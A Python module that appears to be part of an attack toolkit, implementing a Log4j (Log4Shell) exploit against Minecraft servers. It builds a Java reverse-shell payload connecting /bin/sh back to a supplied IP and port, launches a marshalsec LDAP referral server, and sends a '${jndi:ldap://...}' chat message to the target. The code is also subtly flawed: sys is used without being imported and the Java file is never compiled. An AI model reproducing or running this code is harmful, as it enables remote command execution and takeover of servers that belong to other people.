from minecraft.networking.connection import Connection
import minecraft.networking.packets
import subprocess


class Exploit:
    """Exploit schema"""

    def __init__(self, client: Connection = None, command: str = None, ip: str = None, port: str = None):
        self.name = "Log4j"
        self.description = "Java vuln that allows user to issue commands to the server to make an LDAP connection"
        self.command = command
        self.client = client
        self.ip = ip
        self.port = port
        self.success = False

    def execute(self) -> tuple[bool, str]:
        self.client.register_packet_listener(
            self.waitForResponse, minecraft.networking.packets.ChatMessagePacket)

        packet = minecraft.networking.packets.ChatPacket()

        genExploit = (
                         """
        import java.io.IOException;
        import java.io.InputStream;
        import java.io.OutputStream;
        import java.net.Socket;
    
        public class Exploit {
    
        public Exploit() throws Exception {
        String host="%s";
        int port=%s;
        String cmd="/bin/sh";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
        while(pi.available()>0)
        so.write(pi.read());
        while(pe.available()>0)
        so.write(pe.read());
        while(si.available()>0)
        po.write(si.read());
        so.flush();
        po.flush();
        Thread.sleep(50);
        try {
        p.exitValue();
        break;
        }
        catch (Exception e){
        }
        };
        p.destroy();
        s.close();
        }
        }
        """) % (self.ip, self.port)

        with open("Exploit.java", "w") as f:
            f.write(genExploit)

        javaver = subprocess.call(['./jdk1.8.0_20/bin/java', '-version'], stderr=subprocess.DEVNULL,
                                  stdout=subprocess.DEVNULL)
        if javaver != 0:
            sys.exit()

        url = "http://{}:{}/#Exploit".format(self.ip, self.port)
        subprocess.run(["./jdk1.8.0_20/bin/java", "-cp",
                        "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", url])

        packet.message = "${jndi:ldap://%s:%s/a}" % (self.ip, self.port)
        self.client.write_packet(packet)

        return True, "Success in Message"
